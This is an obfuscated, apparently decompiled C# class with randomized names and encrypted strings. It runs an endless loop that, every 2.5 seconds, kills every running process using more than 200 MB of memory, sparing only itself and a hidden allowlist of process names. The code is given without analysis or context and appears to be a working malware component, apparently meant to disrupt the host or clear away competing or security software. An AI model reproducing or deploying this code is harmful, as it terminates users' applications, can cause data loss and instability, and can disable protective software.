using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gtzdezosLTmcL;

public static class tqpnroVaXzW
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void LMrPeZTmUotN()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107364789)) && !process.ProcessName.Contains(getString_0(107364780)) && !process.ProcessName.Contains(getString_0(107364803)) && !process.ProcessName.Contains(getString_0(107364794)) && !process.ProcessName.Contains(getString_0(107364749)) && !process.ProcessName.Contains(getString_0(107364768)) && !process.ProcessName.Contains(getString_0(107364723)) && !process.ProcessName.Contains(getString_0(107364742)) && !process.ProcessName.Contains(getString_0(107364729)) && !process.ProcessName.Contains(getString_0(107364684)) && !process.ProcessName.Contains(getString_0(107364695)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static tqpnroVaXzW()
	{
		Strings.CreateGetStringDelegate(typeof(tqpnroVaXzW));
	}
}
